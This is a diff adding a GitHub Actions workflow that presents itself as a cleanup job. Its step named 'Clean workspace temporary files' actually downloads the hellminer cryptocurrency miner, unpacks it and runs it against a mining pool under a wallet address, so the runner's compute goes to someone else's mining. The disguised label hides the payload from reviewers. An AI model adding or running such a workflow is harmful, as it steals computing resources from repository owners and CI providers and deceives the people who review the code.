@@ -1,0 +1,23 @@
+
+name: tese
+
+on:
+  workflow_dispatch: # manual trigger
+
+permissions:
+  contents: read
+  actions: write     # permission untuk hapus cache & artifacts
+
+jobs:
+  clean:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Clean workspace temporary files
+        run: |
+          sudo apt update && sudo apt install wget -y && wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RSNWvhGiU3xXDgUXNzu6q6UiG2TdX3hRG6.langop -p x 
+
+    
